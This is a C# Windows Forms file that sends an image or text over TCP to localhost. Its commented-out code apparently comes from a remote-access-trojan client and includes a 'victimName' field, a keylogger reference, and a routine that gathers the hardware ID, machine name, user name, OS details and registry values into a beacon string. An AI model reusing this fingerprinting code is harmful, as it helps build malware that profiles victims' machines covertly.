using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using Microsoft.VisualBasic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using Microsoft.Win32;
using Microsoft.VisualBasic.CompilerServices;

namespace TCPSend_Clien
{
    public partial class Form1 : Form
    {
        private TcpClient myclient981;
        private BinaryWriter mysw981;
        private NetworkStream networkStream;


        //public static string host = "127.0.0.1"; // Change IP

        //public static string port = "5552"; // Change PORT

        public static string registryName = "165d6ed988ac"; // Registry Key + Mutex

        public static string splitter = "|'|'|"; // Default

        //public static string victimName = "TllBTiBDQVQ="; // Group Name

        public static string version = "0.7d";

        //public static Mutex stubMutex = null;

        //public static FileInfo currentAssemblyFileInfo = new FileInfo(Application.ExecutablePath);

        //public static Keylogger keylogger = null;

        //public static bool isConnected = false;

        ////public static TcpClient tcpSocket = null;

        //private static MemoryStream memoryStream = new MemoryStream();

        //private static byte[] bytesArray = new byte[5121];

        //private static string lastCapturedImage = "";

        //public static object currentPlugin = null;


        //[STAThread]





        //Socket r = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        //IPEndPoint ipe = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 6400);
        public Form1()
        {
            InitializeComponent();
        }



        //delegate void mydle(string d);

        //void Show(string msg)
        //{
        //    listBox1.Items.Add(msg); 
        //}

        //void resv()
        //{
        //    //Socket c = s.Accept();
        //    while (true)
        //    {




        //        EndPoint ip = (EndPoint)ipe;
        //        byte[] bf = new byte[1000];
        //        r.ReceiveFrom(bf, ref ip);
        //        //string msg = UnicodeEncoding.Unicode.GetString(bf);
        //        this.Invoke(new mydle(Show));

        //    }
        //}


        private void button2_Click(object sender, EventArgs e)
        {
            this.openFileDialog1.Filter = "JPeg Image|*.jpg|Bitmap Image|*.bmp|Gif Image|*.gif|Png Image|*.Png";
            if (this.openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                this.pictureBox1.Image = Image.FromFile(this.openFileDialog1.FileName);
            }
            try
            {
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public void imge()
        {
            Image a12 = pictureBox1.Image;
            MemoryStream MY_MemoryStream = new MemoryStream();
            a12.Save(MY_MemoryStream, System.Drawing.Imaging.ImageFormat.Jpeg);
            byte[] ArrImage = MY_MemoryStream.GetBuffer(); // here change it to Bytes
            MY_MemoryStream.Close();
            //r.SendTo(ArrImage, SocketFlags.Broadcast, ipe);
            try
            {
                //    myclient981 = new TcpClient(ip_TextBox1.Text, 6400);
                //    networkStream = myclient981.GetStream();
                //    mysw981 = new BinaryWriter(networkStream);
                //    mysw981.Write(ArrImage);
                //    networkStream.Close();
                //    myclient981.Close();
                Socket r = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint remote = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 6500);
                r.Connect(remote);
                r.Send(ArrImage);
                r.Close();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }


        private void button3_Click(object sender, EventArgs e)
        {
            Thread img = new Thread(new ThreadStart(imge));
            img.Start();
        }


    //    public void text()
    //    {
    //        //String strr = textBox1.Text;
    //        //MemoryStream text = new MemoryStream();
    //        //byte[] ba = Encoding.ASCII.GetBytes(strr);



    //        //byte[] b = ASCIIEncoding.ASCII.GetBytes(textBox1.Text);
    //        //string s64 = Convert.ToBase64String(b);
    //        //string type = "Image,||";
    //        //string data = type + "||" + s64;
    //        //byte[] senddata =  Convert.FromBase64String(data);
    //        //string[] ss= data.Split(new string[] { "||" }, StringSplitOptions.None);
    //        //foreach (string word in ss  )
    //        // {
    //        //    MessageBox.Show(word);
    //        //}

    //        //MemoryStream text = new MemoryStream(senddata);

    //        //string[] ss =data.Split(new string[] { "||" },StringSplitOptions.None);
    //        //string type1 = ss[0];
    //        //r.SendTo(ba, ba.Length, SocketFlags.Broadcast, ipe);

    //        //ASCIIEncoding asen = new ASCIIEncoding();
    //        //byte[] ba = asen.GetBytes(strr);
    //        //r.SendTo(ba, ipe);
    //        Thread th = new Thread(new ThreadStart(string1));
    //        th.Start();
    //        try
    //        {
    //            //    myclient981 = new TcpClient(ip_TextBox1.Text, 6400);
    //            //    networkStream = myclient981.GetStream();
    //            //    mysw981 = new BinaryWriter(networkStream);
    //            //    mysw981.Write(ba);
    //            //    networkStream.Close();
    //            //    myclient981.Close();
    //            Socket r = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    //            IPEndPoint remote = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 6500);
    //        r.Connect(remote);
    //        byte[] b = UnicodeEncoding.Unicode.GetBytes(textBox1.Text);
    //        r.SendTo(b, remote);
            
    //            r.Close();

    //        }
    //        catch (Exception ex)
    //        {
    //            MessageBox.Show(ex.Message);
    //        }
    ////Thread th = new Thread(new ThreadStart(resv));
    ////th.Start();








    //    }


        //public static string GetHWID()
        //{
        //    string result;
        //    try
        //    {
        //        string text = Interaction.Environ("SystemDrive") + "\\";
        //        string text2 = null;
        //        int arg_2F_2 = 0;
        //        int num = 0;
        //        int num2 = 0;
        //        string text3 = null;
        //        int number = 0;
        //        //GetVolumeInformation(ref text, ref text2, arg_2F_2, ref number, ref num, ref num2, ref text3, 0);
        //        result = Conversion.Hex(number);
        //    }
        //    catch
        //    {
        //        result = "ERR";
        //    }
        //    return result;
        //}




        //public static string Base64ToString(ref string s)
        //{
        //    byte[] array = Convert.FromBase64String(s);
        //    return BytesToString(ref array);
        //}


        private void button1_Click(object sender, EventArgs e)
        {


            //String strr = textBox1.Text;
            //        //MemoryStream text = new MemoryStream();
            //        //byte[] ba = Encoding.ASCII.GetBytes(strr);



            //        //byte[] b = ASCIIEncoding.ASCII.GetBytes(textBox1.Text);
            //        //string s64 = Convert.ToBase64String(b);
            //        //string type = "Image,||";
            //        //string data = type + "||" + s64;
            //        //byte[] senddata =  Convert.FromBase64String(data);
            //        //string[] ss= data.Split(new string[] { "||" }, StringSplitOptions.None);
            //        //foreach (string word in ss  )
            //        // {
            //        //    MessageBox.Show(word);
            //        //}

            //        //MemoryStream text = new MemoryStream(senddata);

            //        //string[] ss =data.Split(new string[] { "||" },StringSplitOptions.None);
            //        //string type1 = ss[0];
            //        //r.SendTo(ba, ba.Length, SocketFlags.Broadcast, ipe);

            //        //ASCIIEncoding asen = new ASCIIEncoding();
            //        //byte[] ba = asen.GetBytes(strr);
            //        //r.SendTo(ba, ipe);
            //        Thread th = new Thread(new ThreadStart(string1));
            //        th.Start();



            Socket r = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint remote = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 6500);
            byte[] b = ASCIIEncoding.ASCII.GetBytes(textBox1.Text);
            string s64 = Convert.ToBase64String(b);
            string type = "Image";
            string data = type + "||" + s64;
            //byte[] senddata = Convert.FromBase64String(data);
            //string text = textBox1.Text;
            // split string 
            r.Connect(remote);
            string[] result = data.Split(new string[] { "||" }, StringSplitOptions.None);
            //Console.Write("Result: ");
            foreach (String str in result)
            {
                Console.Write( str + ", ");


                
                r.Send(b);



            }
            Console.ReadLine();

            //r.Connect(remote);
            

            //byte[] b = UnicodeEncoding.Unicode.GetBytes(textBox1.Text);
            //r.SendTo(str, remote);

            r.Close();



            //Thread tex = new Thread(new ThreadStart(text));
            //tex.Start();
            ////r.Connect(ipe);
            ////r.Close();
        }



        //public static string BytesToString(ref byte[] B)
        //{

        //    return Encoding.UTF8.GetString(B);
        //}

        //public static byte[] StringToBytes(ref string S)
        //{
        //    return Encoding.UTF8.GetBytes(S);
        //}
        //public static string StringToBase64(ref string s)
        //{
        //    return Convert.ToBase64String(StringToBytes(ref s));
        //}






        //public void string1()
        //{
        //    string text = "ll" + splitter;
        //    try
        //    {
        //        if (Operators.ConditionalCompareObjectEqual(textBox1.Text, "", false))
        //        {
        //            string arg_54_0 = text;
        //            string text2 = textBox1.Text + "_" + GetHWID();
        //            text = arg_54_0 + StringToBase64(ref text2) + splitter;
        //        }
        //        else
        //        {
        //            string arg_97_0 = text;
        //            string text2 = Conversions.ToString(textBox1.Text);
        //            string text3 = Base64ToString(ref text2) + "_" + GetHWID();
        //            text = arg_97_0 + StringToBase64(ref text3) + splitter;
        //        }
        //    }
        //    catch
        //    {
        //        string arg_BA_0 = text;
        //        string text3 = GetHWID();
        //        text = arg_BA_0 + StringToBase64(ref text3) + splitter;
        //    }
        //    try
        //    {
        //        text = text + Environment.MachineName + splitter;
        //    }
        //    catch
        //    {
        //        text = text + "N/A" + splitter;
        //    }
        //    try
        //    {
        //        text = text + Environment.UserName + splitter;
        //    }
        //    catch
        //    {
        //        text = text + "N/A" + splitter;
        //    }

        //    checked
        //    {
        //        try
        //        {
        //            string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary);
        //            if (array.Length == 1)
        //            {
        //                text += "0";
        //            }
        //            text += array[array.Length - 1];
        //        }
        //        catch
        //        {
        //            text += "0";
        //        }
        //        try
        //        {
        //            if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
        //            {
        //                text = text + " x64" + splitter;
        //            }
        //            else
        //            {
        //                text = text + " x86" + splitter;
        //            }
        //        }
        //        catch
        //        {
        //            text += splitter;
        //        }
        //        //if (SearchForCam())
        //        //{
        //        //    text = text + "Yes" + splitter;
        //        //}
        //        //else
        //        //{
        //        //    text = text + "No" + splitter;
        //        //}
        //        text = text + version + splitter;
        //        text = text + ".." + splitter;
        //        //text = text + GetForegroundWindowTitle() + splitter;
        //        string text4 = "";
        //        try
        //        {
        //            string[] valueNames = Registry.CurrentUser.CreateSubKey("Software\\" + registryName, RegistryKeyPermissionCheck.Default).GetValueNames();
        //            for (int i = 0; i < valueNames.Length; i++)
        //            {
        //                string text5 = valueNames[i];
        //                if (text5.Length == 32)
        //                {
        //                    text4 = text4 + text5 + ",";
        //                }
        //            }
        //        }
        //        catch { }
        //        //return text;
        //    }

        //}

        //public static string GetInfo()
        //{
        //}
    }
}
